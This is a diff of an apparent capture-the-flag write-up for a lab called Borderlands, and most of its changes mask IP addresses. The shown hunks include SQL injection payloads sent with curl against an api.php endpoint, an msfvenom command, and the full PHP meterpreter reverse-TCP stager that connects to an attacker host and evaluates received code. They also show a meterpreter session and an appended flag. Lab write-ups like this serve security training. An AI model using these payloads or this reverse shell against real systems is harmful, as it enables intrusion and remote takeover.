@@ -428,7 +428,7 @@ if ($docDetails !== null)
 <p align="center">Navigated to the path below, intercepted it with Burp Suite and saved the request to <code>req</code>.</p>
 
 ```bash
-http://Target_IP/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1
+http:///xx.xxx.xx.xx/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1
 ```
 
 <img width="1119" height="97" alt="image" src="https://github.com/user-attachments/assets/e9c504a7-b125-40ea-8470-53b277e98136" />
@@ -519,29 +519,29 @@ Session completed.
 <h3 align="center">Testing the suggested payloads to practice</h3>
 
 ```bash
-:~/Borderlands# curl -s 'http://10.10.143.3/api.php? apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND 1278=1278'
+:~/Borderlands# curl -s 'http:///xx.xxx.xx.xx/api.php? apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND 1278=1278'
 Document ID: 1<br />Document Name: Context_Red_Teaming_Guide.pdf<br />Document Location: Context_Red_Teaming_Guide.pdf<br />
 ```
 
 ```bash
-:~/Borderlands# curl -s 'http://10.10.143.3/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 8449 FROM(SELECT COUNT(*),CONCAT(0x7178626b71,(SELECT (ELT(8449=8449,1))),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)'
+:~/Borderlands# curl -s 'http:///xx.xxx.xx.xx/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 8449 FROM(SELECT COUNT(*),CONCAT(0x7178626b71,(SELECT (ELT(8449=8449,1))),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)'
 Duplicate entry 'qxbkq1qqbqq1' for key '<group_key>
 ```
 
 ```bash
-:~/Borderlands# curl -s 'http://10.10.143.3/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 6817 FROM (SELECT(SLEEP(5)))KnNM)'
+:~/Borderlands# curl -s 'http:///xx.xxx.xx.xx/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 6817 FROM (SELECT(SLEEP(5)))KnNM)'
 Document ID: 1<br />Document Name: Context_Red_Teaming_Guide.pdf<br />Document Location: Context_Red_Teaming_Guide.pdf<br />
 ```
 
 
 ```bash
-:~/Borderlands# curl -s 'http://10.10.143.3/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 6817 FROM (SELECT(SLEEP(5)))KnNM)'
+:~/Borderlands# curl -s 'http:///xx.xxx.xx.xx/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 6817 FROM (SELECT(SLEEP(5)))KnNM)'
 Document ID: 1<br />Document Name: Context_Red_Teaming_Guide.pdf<br />Document Location: Context_Red_Teaming_Guide.pdf<br />
 ```
 
 
 ```bash
-:~/Borderlands# curl -s 'http://10.10.143.3/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=-2023 UNION ALL SELECT CONCAT(0x7178626b71,0x587a574543766d6e55636f7341664959665072586a674c77546c446f4159734348436f776a416d48,0x7171627171),NULL,NULL-- -'
+:~/Borderlands# curl -s 'http:///xx.xxx.xx.xx/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=-2023 UNION ALL SELECT CONCAT(0x7178626b71,0x587a574543766d6e55636f7341664959665072586a674c77546c446f4159734348436f776a416d48,0x7171627171),NULL,NULL-- -'
 Document ID: qxbkqXzWECvmnUcosAfIYfPrXjgLwTlDoAYsCHCowjAmHqqbqq<br />Document Name: <br />Document Location: <br />
 ```
 
@@ -620,18 +620,21 @@ os-shell>
 <h3 align="center">msfvenom</h3>
 
 ```bash
-:~/Borderlands# msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.195.74 lport=4444 -f raw
+:~/Borderlands# msfvenom -p php/meterpreter/reverse_tcp lhost=XX.XXX.XXX.XX lport=4444 -f raw
 [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
 [-] No arch selected, selecting arch: php from the payload
 No encoder specified, outputting raw payload
 Payload size: 1113 bytes
-/*<?php /**/ error_reporting(0); $ip = '10.10.195.74'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
+/*<?php /**/ error_reporting(0); $ip = 'XX.XXX.XXX.XX'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
 ```
 
-<p align="center"><em>shell.php</em></p>
+<img width="1258" height="217" alt="image" src="https://github.com/user-attachments/assets/65b24586-e2d7-4fc7-8145-c6d0b00a9f85" />
+
+
+<p align="center"><em>rev.php</em></p>
 
 ```bash
-<?php /**/ error_reporting(0); $ip = '10.10.195.74'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
+/*<?php /**/ error_reporting(0); $ip = 'xx.xxx.xxx.xx'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
 ```
 
 <img width="861" height="98" alt="image" src="https://github.com/user-attachments/assets/b5be2fd9-fe26-4d08-9ada-d6de87cc1e48" />
@@ -857,5 +860,9 @@ Process List
 [*] Completed  : /root/Borderlands/nc.exe -> nc.exe
 meterpreter > 
 ``
+
+
+
+{FLAG:TCP:8fb04648d6b2bd40af6581942fcf483e}
 
 
